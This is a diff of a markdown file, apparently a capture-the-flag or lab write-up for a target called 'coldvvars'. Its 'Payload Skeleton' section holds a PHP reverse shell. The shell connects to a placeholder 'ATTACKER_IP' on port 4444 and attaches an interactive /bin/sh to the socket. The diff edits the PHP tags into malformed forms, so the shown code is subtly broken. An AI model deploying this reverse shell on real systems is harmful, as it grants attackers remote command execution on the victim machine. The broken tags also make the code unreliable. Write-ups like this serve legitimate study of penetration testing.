@@ -7,7 +7,7 @@ Used on: **coldvvars**
 ## Payload Skeleton
 
 ```php
-<?php
+<php
 $ip = 'ATTACKER_IP';
 $port = 4444;
 $sock = fsockopen($ip, $port);
@@ -16,7 +16,7 @@ $proc = proc_open('/bin/sh -i', array(
   1 => $sock,
   2 => $sock
 ), $pipes);
-?>
+>
 ```
 
 ## Listener And Trigger
